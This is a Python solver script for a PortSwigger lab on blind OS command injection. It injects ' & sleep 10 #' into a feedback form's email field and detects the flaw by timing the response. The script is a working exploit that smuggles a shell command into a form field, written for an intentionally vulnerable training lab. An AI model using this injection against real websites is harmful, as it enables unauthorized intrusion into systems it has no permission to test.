# Blind OS command injection with time delays

# https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token: %s' % csrf)
	return csrf

def run_sleep(s, url):
	feedback_path = url + '/feedback'
	submit_path = url + '/feedback/submit'
	command_injection = ' & sleep 10 #'
	print("\n[+] Extracting CSRF Token from the feedback page...")
	r = s.get(feedback_path)
	session = s.cookies.get('session')
	print('[+] Found Cookie Session: %s' % session)
	csrf_token = get_csrf_token(r)
	params = {'email': command_injection + 'gwyo@attacker.com', 'name': 'gwyo', 'subject': 'hacked', 'message': 'H4ck3d!!!', 'csrf': csrf_token}
	print(f"\n[+] Sending post request on {submit_path}:\n\t{params}\n")
	print(f"[+] Trying to run command '{command_injection}' on the target website...\n")
	cookies = {'session': session}
	res = s.post(submit_path, data=params, cookies=cookies)
	if (res.elapsed.total_seconds()) >= 10:
		print("[+] %s is vulnerable to Command Injection via the EMAIL field!" % url)
	else:
		print("[-] Command Injection Failed !!!")


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind OS command injection with time delays')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind OS command injection with time delays")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying OS Command Injection to cause a delay of 10 secs...\n')
			time.sleep(1)
			run_sleep(s, url)
			time.sleep(2)
			r = s.get(url)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
